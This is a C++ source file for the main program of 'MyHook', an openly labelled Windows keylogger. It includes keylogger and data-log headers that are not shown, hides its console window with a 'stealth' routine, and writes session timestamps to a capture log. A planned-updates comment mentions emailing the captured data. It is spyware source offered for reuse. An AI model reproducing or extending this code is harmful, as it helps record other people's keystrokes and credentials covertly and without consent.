/**
  * @file myhook.cpp
  * @date May 1, 2009
  * @author Daniel Amodio, Patrick Servello
  *
  * MyHook 1.2
  * Origional Code and Concept Copyright 2008 Daniel Amodio (deige101)
  * Created for Major League Coding
  * http://groups.myspace.com/MajorLeagueCoding
  *
  * This program is free software: you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
  * the Free Software Foundation, either version 3 of the License, or
  * (at your option) any later version.
  *
  * This program is distributed in the hope that it will be useful,
  * but WITHOUT ANY WARRANTY; without even the implied warranty of
  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  * GNU General Public License for more details.
  *
  * You should have received a copy of the GNU General Public License
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  *
  */

/*
    TENATIVE UPDATES

    *add support for command line paramaters that let the app react different
        could optionaly email data, or could run in debug mode, etc
    *add abstract class for different ways to catch data.
    
    CHANGELOG
    Implemented Class design

*/

#include <cstdlib>
#include <windows.h>
#include <time.h>
#include "DataLog.h"
#include "KeyLogger.h"


const bool HIDDEN = false;


void hideMe(void);
void startLog(DataLog datalog);

int main (void)
{
    // Check if we need to hide the window
    if (HIDDEN)
       hideMe();
       
    // Create DataLog object. Current LogTypes are DEBUG and LOCAL_FILE
    DataLog datalog(DEBUG);
    
    // Add initial data to the log
    startLog(datalog);
    
    // Create KeyLogger object, and pass DataLog object
    KeyLogger keylog(datalog);
    
    // Pass control to KeyLoggerObject
    
    
    return EXIT_SUCCESS;
}

/**
  * Method to hide the keylogger window
  */
void hideMe(void)
{

     HWND stealth;
     stealth=FindWindowA("ConsoleWindowClass",NULL);
     ShowWindow(stealth,0);
}

/**
  * Method to add a timestamp to the data log
  */
void startLog(DataLog datalog)
{
     time_t ltime;
     ltime=time(NULL);
     datalog.log("\n\n------------------------------------------------------------------------");
     datalog.log("\n\t\t\tMyHook Session\t");
     datalog.log(asctime(localtime(&ltime))); // Add timestamp to data log
     datalog.log("------------------------------------------------------------------------\n");
}   
